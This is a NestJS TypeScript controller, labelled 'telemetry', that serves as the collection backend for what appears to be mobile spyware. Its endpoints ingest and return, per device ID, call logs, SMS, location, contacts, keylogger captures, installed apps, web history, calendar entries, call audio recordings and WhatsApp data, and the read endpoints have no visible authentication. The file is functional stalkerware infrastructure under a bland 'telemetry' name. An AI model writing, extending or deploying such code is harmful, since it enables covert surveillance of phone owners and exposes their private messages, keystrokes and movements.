import { Controller, Get, Post, Body, Query, Param } from '@nestjs/common';
import { 
  TelemetryService, 
  CallLogDto, 
  SmsLogDto, 
  LocationLogDto, 
  ContactItemDto, 
  KeylogItemDto, 
  InstalledAppDto, 
  WebHistoryDto, 
  CalendarEventDto 
} from './telemetry.service';

@Controller('telemetry')
export class TelemetryController {
  constructor(private readonly telemetryService: TelemetryService) {}

  // Normalized Event Stream Ingestion Endpoint (POST /api/v1/telemetry/events)
  @Post('events')
  async ingestEvents(@Body() body: { deviceId?: string; events?: any[] }) {
    return this.telemetryService.ingestEvents(body.deviceId || 'dev_01', body.events || []);
  }

  // 1. Calls Endpoints
  @Post('calls')
  async ingestCalls(@Query('deviceId') deviceId: string, @Body() body: { logs: CallLogDto[] }) {
    return this.telemetryService.ingestCalls(deviceId, body.logs || []);
  }

  @Get('calls/:deviceId')
  async getCalls(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getCalls(deviceId);
  }

  // 2. SMS Endpoints
  @Post('sms')
  async ingestSms(@Query('deviceId') deviceId: string, @Body() body: { logs: SmsLogDto[] }) {
    return this.telemetryService.ingestSms(deviceId, body.logs || []);
  }

  @Get('sms/:deviceId')
  async getSms(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getSms(deviceId);
  }

  // 3. Location Endpoints
  @Post('location')
  async ingestLocations(@Query('deviceId') deviceId: string, @Body() body: { locations: LocationLogDto[] }) {
    return this.telemetryService.ingestLocations(deviceId, body.locations || []);
  }

  @Get('location/:deviceId')
  async getLocations(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getLocations(deviceId);
  }

  // 4. Contacts Endpoints
  @Post('contacts')
  async ingestContacts(@Query('deviceId') deviceId: string, @Body() body: { contacts: ContactItemDto[] }) {
    return this.telemetryService.ingestContacts(deviceId, body.contacts || []);
  }

  @Get('contacts/:deviceId')
  async getContacts(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getContacts(deviceId);
  }

  // 5. Keylogger Endpoints
  @Post('keylogger')
  async ingestKeylogger(@Query('deviceId') deviceId: string, @Body() body: { keylogs: KeylogItemDto[] }) {
    return this.telemetryService.ingestKeylogger(deviceId, body.keylogs || []);
  }

  @Get('keylogger/:deviceId')
  async getKeylogger(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getKeylogger(deviceId);
  }

  // 6. Installed Apps Endpoints
  @Post('installed-apps')
  async ingestInstalledApps(@Query('deviceId') deviceId: string, @Body() body: { apps: InstalledAppDto[] }) {
    return this.telemetryService.ingestInstalledApps(deviceId, body.apps || []);
  }

  @Get('installed-apps/:deviceId')
  async getInstalledApps(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getInstalledApps(deviceId);
  }

  // 6.5 App Usage Telemetry Endpoints
  @Get('app-usage/:deviceId')
  async getAppUsage(
    @Param('deviceId') deviceId: string,
    @Query('from') from?: string,
    @Query('to') to?: string,
  ) {
    return this.telemetryService.getAppUsage(deviceId, from, to);
  }

  @Post('app-usage/delete')
  async deleteAppUsage(@Body() body: { deviceId: string; ids: string[] }) {
    return this.telemetryService.deleteAppUsage(body.deviceId, body.ids || []);
  }

  @Post('app-usage/delete-all')
  async deleteAllAppUsage(@Body() body: { deviceId: string }) {
    return this.telemetryService.deleteAllAppUsage(body.deviceId);
  }

  // 7. Web History Endpoints
  @Post('web-history')
  async ingestWebHistory(@Query('deviceId') deviceId: string, @Body() body: { history: WebHistoryDto[] }) {
    return this.telemetryService.ingestWebHistory(deviceId, body.history || []);
  }

  @Get('web-history/:deviceId')
  async getWebHistory(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getWebHistory(deviceId);
  }

  // 8. Calendar Events Endpoints
  @Post('calendar')
  async ingestCalendar(@Query('deviceId') deviceId: string, @Body() body: { events: CalendarEventDto[] }) {
    return this.telemetryService.ingestCalendar(deviceId, body.events || []);
  }

  @Get('calendar/:deviceId')
  async getCalendar(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getCalendar(deviceId);
  }

  // 9. Call Audio Recordings Endpoints
  @Get('recordings/:deviceId')
  async getRecordings(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getRecordings(deviceId);
  }

  // 10. WhatsApp & WA Business Telemetry Endpoint
  @Get('whatsapp/:deviceId')
  async getWhatsApp(@Param('deviceId') deviceId: string) {
    return this.telemetryService.getWhatsApp(deviceId);
  }
}
